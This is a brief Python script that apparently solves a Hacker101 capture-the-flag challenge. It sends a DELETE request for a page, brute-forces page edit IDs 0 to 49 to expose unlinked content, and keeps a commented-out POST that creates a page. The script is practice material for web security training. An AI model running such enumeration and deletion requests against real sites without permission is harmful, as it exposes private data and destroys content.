import requests

r = requests.delete('https://4280944f61e0242471ad1bbf37027b04.ctf.hacker101.com/page/18')
print(r)

for i in range(50):
    r = requests.get(
            'https://4280944f61e0242471ad1bbf37027b04.ctf.hacker101.com/page/edit/' + str(i)
        )

    if r.status_code == 200:
        print(i)
        print(r.headers)
        print(r.text)

# headers = {'content-type': 'application/x-www-form-urlencoded'}
# data = 'title=av&body=avs'
# r = requests.post('https://4280944f61e0242471ad1bbf37027b04.ctf.hacker101.com/page/create',headers=headers,data=data)
# print(r.text)

